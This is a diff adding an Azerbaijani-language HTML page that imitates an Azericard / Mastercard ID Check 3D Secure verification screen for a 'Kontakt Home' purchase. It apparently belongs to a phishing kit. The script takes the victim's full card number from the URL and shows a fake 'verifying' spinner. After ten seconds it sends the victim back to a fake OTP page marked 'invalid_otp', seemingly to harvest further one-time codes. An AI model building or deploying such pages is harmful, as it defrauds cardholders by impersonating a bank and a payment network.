@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azericard - Ödənişin təsdiqi</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #fff; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); width: 100%; max-width: 400px; padding: 40px 30px; text-align: center; }
+        .logos { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 30px; }
+        .logos img { height: 25px; }
+        .spinner { border: 3px solid #e0e0e0; border-top: 3px solid #0d6efd; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #333; font-size: 18px; margin-bottom: 10px; font-weight: 600; }
+        .details { background-color: #e8f0fe; border-radius: 8px; padding: 20px; text-align: left; margin-top: 30px; margin-bottom: 20px; }
+        .details div { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #333; }
+        .details div:last-child { margin-bottom: 0; }
+        .details strong { color: #0d6efd; font-weight: 600; }
+        .footer { font-size: 12px; color: #777; line-height: 1.5; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
+            <span style="font-size: 18px; color: #555; font-weight: 300;">|</span>
+            <span style="font-size: 16px; color: #333; font-weight: 600;">ID Check</span>
+        </div>
+        
+        <div class="spinner"></div>
+        <h2>Zəhmət olmasa gözləyin, məlumatlarınız yoxlanılır...</h2>
+        
+        <div class="details">
+            <div><span>Əməliyyat:</span> <strong>Kontakt Home</strong></div>
+            <div><span>Tarix:</span> <span id="dateField"></span></div>
+            <div><span>Kart:</span> <strong id="cardField">**** **** **** 6134</strong></div>
+        </div>
+        
+        <div class="footer">
+            🛡️ Bu səhifə, onlayn əməliyyatınızı təhlükəsiz etmək üçün 3D Secure texnologiyasından istifadə edir.
+        </div>
+    </div>
+
+    <script>
+        // Tarixi göstəririk
+        const now = new Date();
+        document.getElementById('dateField').innerText = now.toLocaleDateString('az-AZ') + ' ' + now.toLocaleTimeString('az-AZ');
+
+        // URL-dən kart nömrəsini götürürük
+        const urlParams = new URLSearchParams(window.location.search);
+        const cardParam = urlParams.get('card');
+        if (cardParam) {
+            const last4 = cardParam.slice(-4);
+            document.getElementById('cardField').innerText = '**** **** **** ' + last4;
+        }
+
+        // 10 saniyə sonra OTP səhifəsinə geri qayıdırıq və xəta mesajı yazırıq
+        setTimeout(function() {
+            if (cardParam) {
+                window.location.href = '/azericard/azericard-3ds.html?card=' + cardParam + '&error=invalid_otp';
+            } else {
+                window.location.href = '/azericard/azericard-3ds.html?error=invalid_otp';
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
